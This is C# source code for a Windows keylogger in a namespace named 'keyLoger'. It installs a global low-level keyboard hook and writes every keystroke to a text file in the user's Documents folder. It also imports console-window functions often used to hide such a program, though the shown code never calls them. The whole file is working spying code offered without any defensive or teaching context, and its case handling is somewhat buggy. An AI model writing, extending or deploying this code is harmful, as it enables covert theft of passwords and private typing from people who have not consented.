using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace keyLoger
{
    public static class KeyLoger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x101;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static bool _capslock = true;
        private static bool _shift;

        public static void IntializeLL_KEYBOARDHook()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0/*threadId*/);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            var vkCode = (Keys)Marshal.ReadInt32(lParam);
            if (nCode < 0 && wParam == (IntPtr)WM_KEYUP)
            {
                IsShiftOrCapsLock(vkCode);
            }
            if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
            {
                IsShiftOrCapsLock(vkCode);
                var key = _capslock || _shift
                    ? vkCode.ToString().ToLower()
                    : vkCode.ToString();
                File.AppendAllText("C:\\Users\\" + Environment.UserName + "\\Documents\\KeyLogs.txt",
                string.Format("{0}{1}", key, Environment.NewLine));
                Console.WriteLine(key);
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void IsShiftOrCapsLock(Keys key)
        {
            if (key == Keys.CapsLock)
            {
                _capslock = _capslock ^ true;
            }
            //else if (key == Keys.LShiftKey || key == Keys.RShiftKey)
            //{
            //    _shift = _shift ^ true;
            //}
            
        }

        #region DLL import
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        #endregion
    }
}
